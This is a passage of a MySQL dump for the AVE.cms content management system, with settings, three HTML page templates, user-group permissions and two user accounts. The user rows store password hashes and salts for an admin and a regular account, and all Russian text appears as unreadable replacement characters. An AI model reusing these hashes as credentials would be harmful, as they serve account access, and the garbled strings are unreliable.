) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_settings`
-- 

INSERT INTO `cp_settings` VALUES (1, 'AVE.cms 2.09e', 'mail', 'text/plain', 25, 'smtp.yourserver.ru', 'xxxxx', 'xxxxx', '/usr/sbin/sendmail', 50, 'info@avecms.ru', 'Admin', '������������ %NAME%,\r\n���� ����������� �� ����� %HOST%. \r\n\r\n������ �� ������ ����� �� %HOST% �� ���������� �������:: \r\n\r\n������: %KENNWORT%\r\nE-Mail: %EMAIL%\r\n\r\n-----------------------\r\n%EMAILFUSS%\r\n\r\n', '--------------------\r\nOverdoze Team\r\nwww.overdoze.ru\r\ninfo@overdoze.ru\r\n--------------------', 2, '<h2>������...</h2>\r\n<br />\r\n� ��� ��� ���� �� �������� ����� ���������!.', '<div class="page_navigation_box">%s</div>', '������ �', '� ���������', '�', '�', '�', '�������� %d �� %d', '%d %B %Y', '%d %B %Y, %H:%M', 'ru', '0', '<div class="hidden_box">���������� ������. ����������, <a href="index.php?module=login&action=register">�����������������</a></div>');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_templates`
-- 

CREATE TABLE `cp_templates` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `template_title` varchar(255) NOT NULL,
  `template_text` longtext NOT NULL,
  `template_author_id` int(10) unsigned NOT NULL default '1',
  `template_created` int(10) unsigned NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_templates`
-- 

INSERT INTO `cp_templates` VALUES (1, 'ave_base', '[tag:theme:ave]<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<title>[tag:title]</title>\r\n<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />\r\n<meta http-equiv="pragma" content="no-cache" />\r\n<meta name="Keywords" content="[tag:keywords]" />\r\n<meta name="Description" content="[tag:description]" />\r\n<meta name="robots" content="[tag:robots]" />\r\n[tag:if_print]\r\n<link href="[tag:mediapath]css/print.css" rel="stylesheet" type="text/css" media="all" />\r\n[/tag:if_print]\r\n[tag:if_notprint]\r\n<!--\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/reset.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/text.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/960.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/layout.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/nav.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/modules.css" media="screen" />\r\n\r\n\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-1.3.2.min.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-ui.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-fluid16.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery.form.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/FancyZoom.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/FancyZoomHTML.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/tabs.js"></script>\r\n<script type="text/javascript">\r\n$(document).ready(function(){\r\n	$(''.tab-container'').tabs();\r\n	tooltip();\r\n});\r\n</script>\r\n<script type="text/javascript" src="[tag:mediapath]js/common.js"></script>\r\n-->\r\n\r\n<script>\r\n		var aveabspath = ''[tag:path]'';\r\n</script>\r\n\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/combine.php?css=reset.css,text.css,960.css,layout.css,nav.css,modules.css" media="screen" />\r\n<script type="text/javascript" src="[tag:mediapath]js/combine.php?js=jquery-1.3.2.min.js,jquery-ui.js,jquery.form.js,jquery-fluid16.js,common.js"></script>\r\n\r\n<!-- -->\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shCore.js"></script>\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shBrushCss.js"></script>\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shBrushJScript.js"></script>\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shBrushPhp.js"></script>\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shBrushPlain.js"></script>\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shBrushSql.js"></script>\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shBrushXml.js"></script>\r\n	<link type="text/css" rel="stylesheet" href="[tag:mediapath]syntaxhighlighter/styles/shCore.css"/>\r\n	<link type="text/css" rel="stylesheet" href="[tag:mediapath]syntaxhighlighter/styles/shThemeDefault.css"/>\r\n	<script type="text/javascript">\r\n		SyntaxHighlighter.config.clipboardSwf = ''[tag:mediapath]syntaxhighlighter/scripts/clipboard.swf'';\r\n		SyntaxHighlighter.all();\r\n	</script>\r\n<!-- -->\r\n\r\n[/tag:if_notprint]\r\n</head>\r\n<body id="bodystyle">\r\n[tag:if_notprint]\r\n<div class="container_16">\r\n  <!-- ���� �������� -->\r\n  <div class="grid_16 logobox">\r\n  <h1 id="branding"> <a href="[tag:home]" title="homepage">[tag:title]</a> </h1>\r\n  <div id="fon_header" style="background: url([tag:mediapath]images/fon_header.jpg) no-repeat left 0px;"><p><strong>AVE CMS</strong> - ��������� ����� ���������� ����� �������, �������� �� � ����� ��������, ������� ������ ����� ����������.</p></div>\r\n  </div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- ���� �������� ���� ���� ����� -->\r\n  <div class="grid_16" style="position:relative;">[mod_navigation:2]<div id="search">[mod_search]</div></div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- �������� ���������� -->\r\n  <div class="grid_12">\r\n  [/tag:if_notprint]\r\n[tag:if_print]\r\n<script language="JavaScript" type="text/javascript">\r\n<!--\r\nwindow.resizeTo(680,600);\r\nwindow.moveTo(1,1);\r\nwindow.print();\r\n//-->\r\n</script>\r\n<img src=" [tag:mediapath]images/logo_print.gif" alt="������ ��� ������" /><br />\r\n<strong>������ ��� ������</strong><br />\r\n���������� ����� ��������: [tag:document] <br />\r\n<hr noshade="noshade" size="1" /><br />\r\n[/tag:if_print]\r\n[tag:maincontent]\r\n[tag:if_notprint] \r\n  </div>\r\n  <!-- ������ ������� ���� � �.�. -->\r\n  <div class="grid_4">\r\n  \r\n  <!-- ������ ���� -->\r\n    <div class="box menu">\r\n      <h2><a href="#" id="toggle-section-menu">��������� �� �����</a></h2>\r\n      <div class="block" id="section-menu">[mod_navigation:1]</div>\r\n    </div>\r\n\r\n  <!-- ���� ����������� -->\r\n    <div class="box">\r\n      <h2><a href="#" id="toggle-login-forms">�����������</a></h2>\r\n      <div class="block" id="login-forms">[mod_login]</div>\r\n    </div>\r\n\r\n  <!-- ���� ������� -->\r\n    <div class="box">\r\n      <h2><a href="#" id="toggle-poll">�����������</a></h2>\r\n      <div class="block" id="poll">[mod_poll:1]</div>\r\n    </div>\r\n\r\n<!--\r\n    [mod_ sysblock:20]\r\n-->\r\n\r\n	[mod_online]\r\n\r\n  </div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- ������ -->\r\n  <div class="grid_16" id="site_info">\r\n    <div class="box">\r\n      <p><a target="_blank" href="[tag:printlink]"> \r\n<img src="[tag:mediapath]images/printer.gif" alt="" border="0" class="absmiddle" />������ ��������</a> | \r\n[mod_recommend] | [tag:version]&nbsp;&nbsp;<a href="http://www.bitmap.ru" target="_blank"><img src="[tag:mediapath]images/bitmap_logo_44x17.gif" alt="�������� ������" width="44" height="17" border="0" class="absmiddle"  /></a></p>\r\n    </div>\r\n  </div>\r\n  <div class="clear"></div>\r\n</div>\r\n\r\n[/tag:if_notprint]\r\n</body>\r\n</html>', 1, 1233055478);
INSERT INTO `cp_templates` VALUES (2, 'ave_shop', '[tag:theme:ave]<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<base href="[tag:home]">\r\n<title>[tag:title]</title>\r\n<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />\r\n<meta http-equiv="pragma" content="no-cache" />\r\n<meta name="Keywords" content="[tag:keywords]" />\r\n<meta name="Description" content="[tag:description]" />\r\n<meta name="robots" content="[tag:robots]" />\r\n[tag:if_print]\r\n<link href="[tag:mediapath]css/print.css" rel="stylesheet" type="text/css" media="all" />\r\n[/tag:if_print]\r\n[tag:if_notprint]\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/reset.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/text.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/960.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/layout.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/nav.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/modules.css" media="screen" />\r\n[/tag:if_notprint]\r\n<script>\r\n		var aveabspath = ''[tag:path]'';\r\n</script>\r\n</head>\r\n<body id="bodystyle" onload="setupZoom()">\r\n[tag:if_notprint]\r\n<div class="container_16">\r\n  <!-- ���� �������� -->\r\n  <div class="grid_16 logobox">\r\n  <h1 id="branding"> <a href="[tag:home]" title="homepage">[tag:title]</a> </h1>\r\n  <div id="fon_header" style="background: url([tag:mediapath]images/fon_header.jpg) no-repeat left 0px;"><p><strong>AVE CMS</strong> - ��������� ����� ���������� ����� �������, �������� �� � ����� ��������, ������� ������ ����� ����������.</p></div>\r\n  </div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- ���� �������� ���� ���� ����� -->\r\n  <div class="grid_16" style="position:relative;">[mod_navigation:2]<div id="search">[mod_search]</div></div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- �������� ���������� -->\r\n  [/tag:if_notprint]\r\n[tag:if_print]\r\n<script language="JavaScript" type="text/javascript">\r\n<!--\r\nwindow.resizeTo(680,600);\r\nwindow.moveTo(1,1);\r\nwindow.print();\r\n//-->\r\n</script>\r\n<img src=" [tag:mediapath]images/logo_print.gif" alt="������ ��� ������" /><br />\r\n<strong>������ ��� ������</strong><br />\r\n���������� ����� ��������: [tag:document] <br />\r\n<hr noshade="noshade" size="1" /><br />\r\n[/tag:if_print]\r\n[tag:maincontent]\r\n[tag:if_notprint] \r\n   <div class="clear"></div>\r\n  \r\n  <!-- ������ -->\r\n  <div class="grid_16" id="site_info">\r\n    <div class="box">\r\n      <p><a target="_blank" href="[tag:printlink]"> \r\n<img src="[tag:mediapath]images/printer.gif" alt="" border="0" class="absmiddle" />������ ��������</a> | \r\n[mod_recommend] | [tag:version]&nbsp;&nbsp;<a href="http://www.bitmap.ru" target="_blank"><img src="[tag:mediapath]images/bitmap_logo_44x17.gif" alt="�������� ������" width="44" height="17" border="0" class="absmiddle"  /></a></p>\r\n    </div>\r\n  </div>\r\n  <div class="clear"></div>\r\n</div>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-1.3.2.min.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-ui.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-fluid16.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/FancyZoom.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/FancyZoomHTML.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/tabs.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/common.js"></script>\r\n<script type="text/javascript">\r\n$(document).ready(function(){\r\n	$(''.tab-container'').tabs();\r\n	tooltip();\r\n});\r\n</script>\r\n\r\n[/tag:if_notprint]\r\n</body>\r\n</html>', 1, 1233055478);
INSERT INTO `cp_templates` VALUES (3, 'ave_forum', '[tag:theme:ave]<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<base href="[tag:home]">\r\n<title>[tag:title]</title>\r\n<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />\r\n<meta http-equiv="pragma" content="no-cache" />\r\n<meta name="Keywords" content="[tag:keywords]" />\r\n<meta name="Description" content="[tag:description]" />\r\n<meta name="robots" content="[tag:robots]" />\r\n[tag:if_print]\r\n<link href="[tag:mediapath]css/print.css" rel="stylesheet" type="text/css" media="all" />\r\n[/tag:if_print]\r\n[tag:if_notprint]\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/reset.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/text.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/960.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/layout.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/nav.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/modules.css" media="screen" />\r\n[/tag:if_notprint]\r\n<script>\r\n		var aveabspath = ''[tag:path]'';\r\n</script>\r\n</head>\r\n<body id="bodystyle" onload="setupZoom()">\r\n[tag:if_notprint]\r\n<div class="container_16">\r\n  <!-- ���� �������� -->\r\n  <div class="grid_16 logobox">\r\n  <h1 id="branding"> <a href="[tag:home]" title="homepage">[tag:title]</a> </h1>\r\n  <div id="fon_header" style="background: url([tag:mediapath]images/fon_header.jpg) no-repeat left 0px;"><p><strong>AVE CMS</strong> - ��������� ����� ���������� ����� �������, �������� �� � ����� ��������, ������� ������ ����� ����������.</p></div>\r\n  </div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- ���� �������� ���� ���� ����� -->\r\n  <div class="grid_16" style="position:relative;">[mod_navigation:2]<div id="search">[mod_search]</div></div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- �������� ���������� -->\r\n  [/tag:if_notprint]\r\n[tag:if_print]\r\n<script language="JavaScript" type="text/javascript">\r\n<!--\r\nwindow.resizeTo(680,600);\r\nwindow.moveTo(1,1);\r\nwindow.print();\r\n//-->\r\n</script>\r\n<img src=" [tag:mediapath]images/logo_print.gif" alt="������ ��� ������" /><br />\r\n<strong>������ ��� ������</strong><br />\r\n���������� ����� ��������: [tag:document] <br />\r\n<hr noshade="noshade" size="1" /><br />\r\n[/tag:if_print]\r\n<div id="forums_content" class="grid_16">\r\n[tag:maincontent]\r\n</div>\r\n[tag:if_notprint] \r\n   <div class="clear"></div>\r\n  \r\n  <!-- ������ -->\r\n  <div class="grid_16" id="site_info">\r\n    <div class="box">\r\n      <p><a target="_blank" href="[tag:printlink]"> \r\n<img src="[tag:mediapath]images/printer.gif" alt="" border="0" class="absmiddle" />������ ��������</a> | \r\n[mod_recommend] | [tag:version]&nbsp;&nbsp;<a href="http://www.bitmap.ru" target="_blank"><img src="[tag:mediapath]images/bitmap_logo_44x17.gif" alt="�������� ������" width="44" height="17" border="0" class="absmiddle"  /></a></p>\r\n    </div>\r\n  </div>\r\n  <div class="clear"></div>\r\n</div>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-1.3.2.min.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-ui.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-fluid16.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/FancyZoom.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/FancyZoomHTML.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/tabs.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/common.js"></script>\r\n<script type="text/javascript">\r\n$(document).ready(function(){\r\n	$(''.tab-container'').tabs();\r\n	tooltip();\r\n});\r\n</script>\r\n\r\n[/tag:if_notprint]\r\n</body>\r\n</html>', 1, 1231441011);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_user_groups`
-- 

CREATE TABLE `cp_user_groups` (
  `user_group` smallint(3) unsigned NOT NULL auto_increment,
  `user_group_name` char(50) NOT NULL,
  `status` enum('1','0') NOT NULL default '1',
  `set_default_avatar` enum('1','0') NOT NULL default '0',
  `default_avatar` char(255) NOT NULL,
  `user_group_permission` char(255) NOT NULL,
  PRIMARY KEY  (`user_group`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_user_groups`
-- 

INSERT INTO `cp_user_groups` VALUES (1, '��������������', '1', '0', '', 'alles');
INSERT INTO `cp_user_groups` VALUES (2, '���������', '1', '0', '', '');
INSERT INTO `cp_user_groups` VALUES (3, '���������', '1', '0', '', 'adminpanel|documents|remarks|mediapool|mediapool_del');
INSERT INTO `cp_user_groups` VALUES (4, '������������������', '1', '0', '', '');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_users`
-- 

CREATE TABLE `cp_users` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `password` char(32) NOT NULL,
  `email` char(100) NOT NULL,
  `street` char(100) NOT NULL,
  `street_nr` char(10) NOT NULL,
  `zipcode` char(15) NOT NULL,
  `city` char(100) NOT NULL,
  `phone` char(35) NOT NULL,
  `telefax` char(35) NOT NULL,
  `description` char(255) NOT NULL,
  `firstname` char(50) NOT NULL,
  `lastname` char(50) NOT NULL,
  `user_name` char(50) NOT NULL,
  `user_group` smallint(3) unsigned NOT NULL default '4',
  `user_group_extra` char(255) NOT NULL,
  `reg_time` int(10) unsigned NOT NULL,
  `status` enum('1','0') NOT NULL default '1',
  `last_visit` int(10) unsigned NOT NULL,
  `country` char(2) NOT NULL default 'ru',
  `birthday` char(10) NOT NULL,
  `deleted` enum('0','1') NOT NULL default '0',
  `del_time` int(10) unsigned NOT NULL,
  `emc` char(32) NOT NULL,
  `reg_ip` char(20) NOT NULL,
  `new_pass` char(32) NOT NULL,
  `company` char(255) NOT NULL,
  `taxpay` enum('0','1') NOT NULL default '0',
  `salt` char(16) NOT NULL,
  `new_salt` char(16) NOT NULL,
  `user_ip` int(10) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `email` (`email`),
  UNIQUE KEY `user_name` (`user_name`),
  KEY `user_group` (`user_group`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_users`
-- 

INSERT INTO `cp_users` VALUES (1, '8cc76651e8df4d467b0a3c4020dac49d', 'admin@ave.ru', '', '', '', '', '', '', '', '�''��������', '�''����', 'Admin', 1, '', 1250295071, '1', 1278618423, 'ru', '', '0', 0, '0', '0', 'a628592becaf509fa2ecc7f69a52dd79', '', '', ']3Wh[L5]Bd&1Yu1J', '+Hj(s~[LsL]G?V@~', 2130706433);
INSERT INTO `cp_users` VALUES (2, '545bae08d054452ad66e2469cbca1349', 'user@ave.ru', '', '', '', '', '', '', '<?>~!@#$%^&*()_+-=[]{}\\|/;:''",.`', '���', 'User', 'User', 4, '', 1266891467, '1', 1278058797, 'ua', '', '0', 0, 'c56598f02963cbf87de83c41f8d87187', '127.0.0.1', '0', '', '0', 'wl%JK}xXT6D4}2n!', '', 2130706433);
